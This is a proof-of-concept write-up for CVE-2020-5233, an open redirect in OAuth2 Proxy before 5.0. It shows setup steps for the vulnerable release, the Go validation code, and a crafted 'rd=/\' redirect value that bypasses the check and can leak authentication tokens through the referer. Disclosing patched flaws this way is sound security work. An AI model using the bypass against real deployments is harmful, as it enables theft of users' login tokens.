# CVE-2020-5233

OAuth2 Proxy before 5.0 has an open redirect vulnerability. Authentication tokens could be silently harvested by an attacker. This has been patched in version 5.0.

# PoC

Replace `CLIENT_ID` and `CLIENT_SECRET` in docker-compose.yml with your project's.

```bash
wget https://github.com/pusher/oauth2_proxy/releases/download/v4.1.0/oauth2_proxy-v4.1.0.linux-amd64.go1.13.5.tar.gz
tar xvfz oauth2_proxy-v4.1.0.linux-amd64.go1.13.5.tar.gz
mv oauth2_proxy-v4.1.0.linux-amd64.go1.13.5/oauth2_proxy .

docker-compose up
```

Access to `https://app.example.com/oauth2/start?rd=/\your-domain.com` and logged in.  
Depending on your browser, a `referer` containing the token remains at `your-domain.com` .

## Details

A redirect to the `rd` param in `GetRedirect()` .

https://github.com/pusher/oauth2_proxy/blob/8165f6c4835d5c817ca6cd1853698feb136c77b3/oauthproxy.go#L497

```go
func (p *OAuthProxy) GetRedirect(req *http.Request) (redirect string, err error) {
	err = req.ParseForm()
	if err != nil {
		return
	}

	redirect = req.Header.Get("X-Auth-Request-Redirect")
	if req.Form.Get("rd") != "" {
		redirect = req.Form.Get("rd")
	}
	if !p.IsValidRedirect(redirect) {
		redirect = req.URL.Path
		if strings.HasPrefix(redirect, p.ProxyPrefix) {
			redirect = "/"
		}
	}

	return
}
```

Imperfect validation of `IsValidRedirect` .

- https://github.com/pusher/oauth2_proxy/blob/8165f6c4835d5c817ca6cd1853698feb136c77b3/oauthproxy.go#L518

```go
func (p *OAuthProxy) IsValidRedirect(redirect string) bool {
	switch {
	case strings.HasPrefix(redirect, "/") && !strings.HasPrefix(redirect, "//"):
		return true
	case strings.HasPrefix(redirect, "http://") || strings.HasPrefix(redirect, "https://"):
		redirectURL, err := url.Parse(redirect)
		if err != nil {
			return false
		}
		for _, domain := range p.whitelistDomains {
			if (redirectURL.Host == domain) || (strings.HasPrefix(domain, ".") && strings.HasSuffix(redirectURL.Host, domain)) {
				return true
			}
		}
		return false
	default:
		return false
	}
}
```

This validation can be bypassed with `rd=/\example.com` .

# References

- https://github.com/pusher/oauth2_proxy/security/advisories/GHSA-qqxw-m5fj-f7gv
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5233

